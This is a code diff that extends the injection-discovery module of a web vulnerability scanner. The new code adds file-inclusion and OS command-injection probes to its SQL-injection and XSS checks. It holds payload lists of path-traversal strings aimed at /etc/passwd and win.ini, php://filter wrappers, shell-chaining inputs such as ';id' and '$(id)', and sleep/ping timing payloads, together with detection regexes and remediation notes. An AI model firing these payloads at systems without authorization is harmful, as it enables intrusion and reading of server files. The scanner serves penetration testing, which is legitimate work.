@@ -1,9 +1,17 @@
 """
 HEAVEN — First-pass Injection Discovery
 Rapidly tests every input vector (GET params, POST fields, HTTP headers) from the
-web crawler for SQL injection and XSS.  Produces candidate findings that are then
-promoted to safe_validator for confirmation and, for SQLi, to sqlmap_runner for
-deep exploitation.
+web crawler for the major injection classes — SQL injection, XSS, Local/Remote
+File Inclusion (LFI/RFI), and OS command injection. Produces candidate findings
+that are then promoted to safe_validator for confirmation and, for SQLi, to
+sqlmap_runner for deep exploitation.
+
+Coverage:
+  * SQLi  — error-based, boolean-blind, time-based blind
+  * XSS   — reflected (execution-aware, escaping-resistant FP filter)
+  * LFI   — path traversal + php:// wrappers, content-leak confirmed (CWE-98)
+  * RFI   — best-effort remote-fetch attempt detection (CWE-98)
+  * CmdI  — output-based (`id`/echo) + time-based blind (CWE-78)
 
 Three SQLi detection techniques:
   1. Error-based  — trigger DBMS error messages (fast, reliable when errors shown)
@@ -127,6 +135,72 @@ def _xss_is_executable(payload: str, body: str) -> bool:
         "<svg/onload=",
     ]
     return any(m in low for m in markers)
+
+
+# ── Local/Remote File Inclusion (LFI/RFI) ──────────────────────────
+# Path-traversal + wrapper payloads. Detection is content-based (the included
+# file leaks into the response) so it's high-confidence, not heuristic.
+LFI_PROBES: list[tuple[str, str]] = [
+    ("/etc/passwd", "abs_passwd"),
+    ("../../../../../../../../etc/passwd", "trav_passwd"),
+    ("....//....//....//....//....//etc/passwd", "trav_passwd_bypass"),
+    ("../../../../../../../../etc/passwd%00", "trav_passwd_null"),
+    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "trav_win_ini"),
+    ("php://filter/convert.base64-encode/resource=index.php", "php_filter_b64"),
+]
+LFI_PATTERNS: list[re.Pattern] = [
+    re.compile(r"root:.*?:0:0:", re.I),                 # /etc/passwd line
+    re.compile(r"daemon:.*?:/usr/sbin", re.I),          # /etc/passwd line
+    re.compile(r"\[(extensions|fonts|mci|files)\]", re.I),  # win.ini sections
+    re.compile(r"PD9waHA"),                              # base64("<?php") — php filter leak
+]
+
+# Remote File Inclusion — best-effort: a benign unroutable URL. If the app TRIES
+# to fetch it (stream-open error naming our host, or include() echoing it) it is
+# RFI-capable. Reported high/medium, lower confidence than LFI.
+_RFI_HOST = "heaven-rfi-probe.invalid"
+RFI_PROBES: list[tuple[str, str]] = [
+    (f"http://{_RFI_HOST}/h3av3n.txt", "remote_http"),
+]
+RFI_PATTERNS: list[re.Pattern] = [
+    re.compile(rf"failed to open stream:.*{re.escape(_RFI_HOST)}", re.I),
+    re.compile(rf"(include|require)(_once)?\(\).*{re.escape(_RFI_HOST)}", re.I),
+    re.compile(r"allow_url_(include|fopen)", re.I),
+]
+
+# ── OS Command Injection ───────────────────────────────────────────
+# Output-based: shell metacharacters chaining `id`; we detect the uid=… output.
+# Plus a deterministic echo-math marker for apps that swallow id's output.
+_CMDI_MARK = "h3av3n7x7"
+CMDI_PROBES: list[tuple[str, str]] = [
+    (";id", "semicolon_id"),
+    ("| id", "pipe_id"),
+    ("&& id", "and_id"),
+    ("`id`", "backtick_id"),
+    ("$(id)", "subshell_id"),
+    ("127.0.0.1;id", "ip_semicolon_id"),               # for ping-style endpoints (DVWA exec)
+    (f"; echo {_CMDI_MARK}", "echo_marker"),
+    (f"& echo {_CMDI_MARK}", "echo_marker_win"),
+]
+CMDI_PATTERNS: list[re.Pattern] = [
+    re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+\(", re.I),  # `id` output
+    re.compile(_CMDI_MARK),                              # echo marker reflected raw
+]
+# Time-based blind command injection: (payload, sleep_seconds, probe)
+CMDI_TIME_PROBES: list[tuple[str, int, str]] = [
+    (f"; sleep {_SLEEP}", _SLEEP, "semicolon_sleep"),
+    (f"| sleep {_SLEEP}", _SLEEP, "pipe_sleep"),
+    (f"& ping -n {_SLEEP + 1} 127.0.0.1", _SLEEP, "win_ping"),
+]
+
+
+def _inclusion_hit(body: str) -> Optional[str]:
+    """Return the matched LFI pattern (proof the included file leaked), else None."""
+    for pat in LFI_PATTERNS:
+        if pat.search(body):
+            return pat.pattern
+    return None
+
 
 # Headers worth injecting into for reflected XSS / header injection
 INJECTABLE_HEADERS = ["Referer", "X-Forwarded-For", "User-Agent", "X-Original-URL"]
@@ -495,6 +569,125 @@ class InjectionScanner:
 
     # ── Per-URL orchestration ─────────────────────────────────────
 
+    # ── File Inclusion (LFI / RFI) ────────────────────────────────
+    async def _test_inclusion_param(self, session, url: str, param: str,
+                                    baseline_body: str, *, post: bool = False,
+                                    other_fields: Optional[dict] = None) -> None:
+        """LFI (included-file content leak) + RFI (remote-fetch attempt)."""
+        async def _probe(payload: str) -> str:
+            async with self._sem:
+                if self._delay:
+                    await asyncio.sleep(self._delay)
+                if post:
+                    _, body = await _post(session, url, {**(other_fields or {}), param: payload}, self._headers)
+                else:
+                    _, body = await _get(session, _inject_param(url, param, payload), self._headers)
+            return body or ""
+
+        for payload, probe in LFI_PROBES:
+            body = await _probe(payload)
+            hit = _inclusion_hit(body) if body else None
+            if hit and not _inclusion_hit(baseline_body):
+                self._add_finding(
+                    target=url, vuln_type="lfi",
+                    title=f"Local File Inclusion / Path Traversal — param '{param}'",
+                    severity="critical", confidence=0.9,
+                    evidence={"param": param, "payload": payload, "probe": probe,
+                              "match": hit, "method": "POST" if post else "GET", "url": url},
+                    remediation="Never pass user input to file/include calls; allow-list file IDs.",
+                    cwe="CWE-98",
+                )
+                break  # one LFI per param is enough
+
+        for payload, probe in RFI_PROBES:
+            body = await _probe(payload)
+            if not body:
+                continue
+            for pat in RFI_PATTERNS:
+                if pat.search(body) and not pat.search(baseline_body):
+                    self._add_finding(
+                        target=url, vuln_type="rfi",
+                        title=f"Remote File Inclusion (attempted remote fetch) — param '{param}'",
+                        severity="high", confidence=0.6,
+                        evidence={"param": param, "payload": payload, "probe": probe,
+                                  "match": pat.pattern, "method": "POST" if post else "GET", "url": url},
+                        remediation="Disable allow_url_include; never include user-supplied URLs.",
+                        cwe="CWE-98",
+                    )
+                    return
+
+    # ── OS Command Injection ──────────────────────────────────────
+    async def _test_cmdi_param(self, session, url: str, param: str,
+                               baseline_body: str, *, post: bool = False,
+                               other_fields: Optional[dict] = None) -> None:
+        """Command injection: output-based (`id`/echo marker) then time-based blind."""
+        async def _probe(payload: str, timeout: float = 8.0) -> tuple[float, str]:
+            t0 = time.monotonic()
+            async with self._sem:
+                if self._delay:
+                    await asyncio.sleep(self._delay)
+                if post:
+                    _, body = await _post(session, url, {**(other_fields or {}), param: payload},
+                                          self._headers, timeout=timeout)
+                else:
+                    _, body = await _get(session, _inject_param(url, param, payload),
+                                         self._headers, timeout=timeout)
+            return time.monotonic() - t0, body or ""
+
+        # 1) Output-based — shell metacharacters chaining `id` / echo. Use a
+        # generous timeout: command endpoints often run a slow command first
+        # (e.g. DVWA's exec runs `ping -c 4 <ip>` before our `;id`), so an 8s
+        # cap would truncate the response and miss the injected output.
+        for payload, probe in CMDI_PROBES:
+            _, body = await _probe(payload, timeout=20.0)
+            if not body:
+                continue
+            for pat in CMDI_PATTERNS:
+                if pat.search(body) and not pat.search(baseline_body):
+                    self._add_finding(
+                        target=url, vuln_type="cmdi",
+                        title=f"OS Command Injection — param '{param}'",
+                        severity="critical", confidence=0.9,
+                        evidence={"param": param, "payload": payload, "probe": probe,
+                                  "match": pat.pattern, "method": "POST" if post else "GET", "url": url},
+                        remediation="Never pass user input to a shell; use argument arrays / safe APIs.",
+                        cwe="CWE-78",
+                    )
+                    return
+
+        # 2) Time-based blind — DIFFERENTIAL timing to defeat server jitter:
+        #    only flag if doubling the injected sleep adds ~that much delay, i.e.
+        #    the response time is CONTROLLED by our payload, not random latency.
+        #    A naturally slow/jittery endpoint won't scale, so it won't false-fire.
+        base = max((await _probe("1"))[0], (await _probe("1"))[0])
+        if base > 3.0:
+            return  # endpoint too slow/variable for reliable timing
+        for payload, sleep_secs, probe in CMDI_TIME_PROBES:
+            if str(sleep_secs) not in payload:
+                continue  # only sleep-style payloads support the scaling check
+            margin = sleep_secs * _TIME_THRESHOLD_FACTOR
+            el1, _ = await _probe(payload, timeout=float(sleep_secs + 8))
+            if el1 < base + margin:
+                continue
+            # Confirm: double the sleep → ~sleep_secs MORE delay (proves control).
+            big_payload = payload.replace(str(sleep_secs), str(sleep_secs * 2), 1)
+            el2, _ = await _probe(big_payload, timeout=float(sleep_secs * 2 + 8))
+            if el2 >= el1 + margin:
+                self._add_finding(
+                    target=url, vuln_type="cmdi",
+                    title=f"OS Command Injection (time-based blind) — param '{param}'",
+                    severity="critical", confidence=0.85,
+                    evidence={"param": param, "payload": payload, "probe": probe,
+                              "technique": "time_blind_differential",
+                              "baseline_sec": round(base, 2),
+                              "elapsed_sleep_sec": round(el1, 2),
+                              "elapsed_double_sec": round(el2, 2),
+                              "method": "POST" if post else "GET", "url": url},
+                    remediation="Never pass user input to a shell; use argument arrays / safe APIs.",
+                    cwe="CWE-78",
+                )
+                return
+
     async def _scan_url(self, session, url: str, forms: list[dict] | None = None) -> None:
         """Scan a single URL — GET params + POST forms."""
         parsed = urlparse(url)
@@ -509,6 +702,8 @@ class InjectionScanner:
                 tasks.append(self._test_sqli_boolean_param(session, url, param, baseline))
                 tasks.append(self._test_sqli_time_param(session, url, param))
                 tasks.append(self._test_xss_param(session, url, param))
+                tasks.append(self._test_inclusion_param(session, url, param, baseline))
+                tasks.append(self._test_cmdi_param(session, url, param, baseline))
             await asyncio.gather(*tasks)
 
         # POST forms
@@ -535,6 +730,10 @@ class InjectionScanner:
                     others = {k: v for k, v in fields.items() if k != param}
                     tasks.append(self._test_sqli_post(session, action, param, baseline, others))
                     tasks.append(self._test_xss_post(session, action, param, others))
+                    tasks.append(self._test_inclusion_param(
+                        session, action, param, baseline, post=True, other_fields=others))
+                    tasks.append(self._test_cmdi_param(
+                        session, action, param, baseline, post=True, other_fields=others))
                 await asyncio.gather(*tasks)
 
         # Header injection check (once per URL)
